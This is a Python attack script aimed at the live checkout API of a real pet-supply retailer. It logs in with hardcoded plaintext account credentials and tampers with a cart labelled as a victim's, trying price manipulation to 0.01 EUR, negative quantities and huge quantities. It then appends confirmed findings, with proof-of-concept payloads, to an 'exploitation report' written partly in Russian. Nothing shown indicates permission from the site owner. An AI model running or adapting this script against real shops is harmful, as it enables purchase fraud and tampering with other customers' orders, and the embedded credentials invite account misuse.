#!/usr/bin/env python3
"""Verify Critical Vulnerabilities"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

VICTIM_CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
endpoint = "/semiprotected/api/checkout/state-api/v2/set-article-quantity"
confirmed_vulns = []

# Get cart before
print("\n[*] Getting victim cart BEFORE...")
resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
if resp.status_code == 200:
    cart_before = resp.json()
    total_before = cart_before.get('summary', {}).get('grandTotal', 0)
    items_before = len(cart_before.get('articles', []))
    print(f"  Before: {items_before} items, {total_before} EUR")
    
    # Test 1: Price manipulation
    print("\n[*] Testing PRICE MANIPULATION...")
    resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": 1, "price": 0.01}, timeout=5, verify=False)
    if resp.status_code == 200:
        import time
        time.sleep(2)
        resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
        if resp2.status_code == 200:
            cart_after = resp2.json()
            total_after = cart_after.get('summary', {}).get('grandTotal', 0)
            print(f"  After: {total_after} EUR")
            if total_after < total_before * 0.5:  # Significant decrease
                print(f"  [CRITICAL] Price manipulation CONFIRMED!")
                print(f"      Before: {total_before} EUR")
                print(f"      After: {total_after} EUR")
                print(f"      Difference: {total_before - total_after} EUR")
                confirmed_vulns.append({
                    "type": "price_manipulation",
                    "severity": "CRITICAL",
                    "endpoint": endpoint,
                    "before": total_before,
                    "after": total_after,
                    "difference": total_before - total_after
                })
    
    # Test 2: Negative quantity
    print("\n[*] Testing NEGATIVE QUANTITY...")
    resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": -5}, timeout=5, verify=False)
    if resp.status_code == 200:
        time.sleep(2)
        resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
        if resp2.status_code == 200:
            cart_after = resp2.json()
            total_after = cart_after.get('summary', {}).get('grandTotal', 0)
            items_after = len(cart_after.get('articles', []))
            print(f"  After: {items_after} items, {total_after} EUR")
            if total_after < total_before or items_after < items_before:
                print(f"  [CRITICAL] Negative quantity CONFIRMED!")
                print(f"      Items: {items_before} -> {items_after}")
                print(f"      Total: {total_before} -> {total_after} EUR")
                confirmed_vulns.append({
                    "type": "negative_quantity",
                    "severity": "CRITICAL",
                    "endpoint": endpoint,
                    "items_before": items_before,
                    "items_after": items_after,
                    "total_before": total_before,
                    "total_after": total_after
                })
    
    # Test 3: Very large quantity
    print("\n[*] Testing VERY LARGE QUANTITY...")
    resp = s.put(f"{base}{endpoint}", json={"articleId": 2966422, "quantity": 999999}, timeout=5, verify=False)
    if resp.status_code == 200:
        time.sleep(2)
        resp2 = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
        if resp2.status_code == 200:
            cart_after = resp2.json()
            total_after = cart_after.get('summary', {}).get('grandTotal', 0)
            print(f"  After: {total_after} EUR")
            if total_after > total_before * 10:  # Significant increase
                print(f"  [CRITICAL] Large quantity manipulation CONFIRMED!")
                confirmed_vulns.append({
                    "type": "quantity_manipulation",
                    "severity": "CRITICAL",
                    "endpoint": endpoint,
                    "quantity": 999999,
                    "total_after": total_after
                })

# Update report if vulnerabilities confirmed
if confirmed_vulns:
    print("\n" + "=" * 70)
    print("CONFIRMED VULNERABILITIES")
    print("=" * 70)
    
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 ПОДТВЕРЖДЕННЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        for v in confirmed_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Description:** Уязвимость позволяет манипулировать данными корзины через параметры, которые не должны быть доступны.\n\n")
            
            if v['type'] == 'price_manipulation':
                f.write(f"**Proof of Concept:**\n")
                f.write(f"```json\n")
                f.write(f'{{"articleId": 2966422, "quantity": 1, "price": 0.01}}\n')
                f.write(f"```\n\n")
                f.write(f"**Impact:**\n")
                f.write(f"- До модификации: {v['before']} EUR\n")
                f.write(f"- После модификации: {v['after']} EUR\n")
                f.write(f"- Разница: {v['difference']} EUR\n\n")
            
            elif v['type'] == 'negative_quantity':
                f.write(f"**Proof of Concept:**\n")
                f.write(f"```json\n")
                f.write(f'{{"articleId": 2966422, "quantity": -5}}\n')
                f.write(f"```\n\n")
                f.write(f"**Impact:**\n")
                f.write(f"- Товаров до: {v['items_before']}\n")
                f.write(f"- Товаров после: {v['items_after']}\n")
                f.write(f"- Сумма до: {v['total_before']} EUR\n")
                f.write(f"- Сумма после: {v['total_after']} EUR\n\n")
            
            f.write("---\n\n")
    
    print(f"[+] Report updated with {len(confirmed_vulns)} confirmed vulnerabilities")
    for v in confirmed_vulns:
        print(f"  [{v['severity']}] {v['type']}")
else:
    print("\n[!] Vulnerabilities not confirmed - may be server-side validation")

print("=" * 70)

